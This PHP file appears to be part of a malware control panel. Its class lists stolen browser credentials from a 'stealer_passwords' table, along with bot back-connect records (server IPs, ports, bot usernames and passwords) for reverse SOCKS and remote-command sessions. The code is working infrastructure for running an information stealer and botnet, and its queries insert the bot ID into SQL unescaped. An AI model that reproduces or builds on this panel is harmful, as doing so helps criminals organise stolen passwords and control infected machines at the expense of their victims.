<?php

class BrowserDataWorker {

    public function sortPasswords($request_data, $botid = NULL) {
        $table = 'stealer_passwords';
        $primaryKey = 'id';
        $columns = array(
            array(
                'db' => 'id',
                'dt' => 'DT_RowId',
                'formatter' => function( $d, $row ) {
                    return 'row_'.$d;
                }
            ),
            array(
                'db' => 'service',
                'dt' => 0
            ),
            array(
                'db' => 'login',
                'dt' => 1
            ),
            array(
                'db' => 'password',
                'dt' => 2
            ),
            array(
                'db' => 'browser',
                'dt' => 3
            )
        );

        $sql_details = array(
            'user' => DATABASE_USER_NAME,
            'pass' => DATABASE_USER_PASSWORD,
            'db'   => DATABASE_NAME,
            'host' => 'localhost'
        );
        $whereAll = null;
        if (!empty($botid)) {
            $whereAll = " botid = '" . $botid . "'";
        }
        return json_encode(SSP::complex($request_data, $sql_details, $table, $primaryKey, $columns, null, $whereAll));
        //return json_encode(SSP::simple($this->response_data, $sql_details, $table, $primaryKey, $columns));
    }

    public function sortBackSocks($request_data, $botid = NULL)
    {
        $table = 'backclients';
        $primaryKey = 'id';
        $columns = array(
            array(
                'db' => 'id',
                'dt' => 'DT_RowId',
                'formatter' => function( $d, $row ) {
                    return 'row_'.$d;
                }
            ),
            array(
                'db' => 'botid',
                'dt' => 0
            ),
            array(
                'db' => 'backserver_ip',
                'dt' => 1
            ),
            array(
                'db' => 'botport',
                'dt' => 2
            ),
            array(
                'db' => 'botuser',
                'dt' => 3
            ),
            array(
                'db' => 'botpass',
                'dt' => 4
            )
        );

        $sql_details = array(
            'user' => REMOTE_DATABASE_USER_NAME,
            'pass' => REMOTE_DATABASE_USER_PASSWORD,
            'db'   => REMOTE_DATABASE_NAME,
            'host' => REMOTE_DATABASE_HOST
        );

        $whereAll = null;

        if (!empty($botid))
        {
            // TODO: Проверить типы в удаленной таблице
            $whereAll = " botid = '" . $botid . "' AND type = 'backsocks'";
        }
        return json_encode(SSP::complex($request_data, $sql_details, $table, $primaryKey, $columns, null, $whereAll));
        //return json_encode(SSP::simple($this->response_data, $sql_details, $table, $primaryKey, $columns));
    }

    public function sortBackCmd($request_data, $botid = NULL)
    {
        $table = 'backclients';
        $primaryKey = 'id';
        $columns = array(
            array(
                'db' => 'id',
                'dt' => 'DT_RowId',
                'formatter' => function( $d, $row ) {
                    return 'row_'.$d;
                }
            ),
            array(
                'db' => 'botid',
                'dt' => 0
            ),
            array(
                'db' => 'backserver_ip',
                'dt' => 1
            ),
            array(
                'db' => 'botport',
                'dt' => 2
            ),
            array(
                'db' => 'botuser',
                'dt' => 3
            ),
            array(
                'db' => 'botpass',
                'dt' => 4
            )
        );

        $sql_details = array(
            'user' => REMOTE_DATABASE_USER_NAME,
            'pass' => REMOTE_DATABASE_USER_PASSWORD,
            'db'   => REMOTE_DATABASE_NAME,
            'host' => REMOTE_DATABASE_HOST
        );

        $whereAll = null;

        if (!empty($botid))
        {
            // TODO: Проверить типы в удаленной таблице
            $whereAll = " botid = '" . $botid . "' AND type = 'backcmd'";
        }
        return json_encode(SSP::complex($request_data, $sql_details, $table, $primaryKey, $columns, null, $whereAll));
        //return json_encode(SSP::simple($this->response_data, $sql_details, $table, $primaryKey, $columns));
    }
}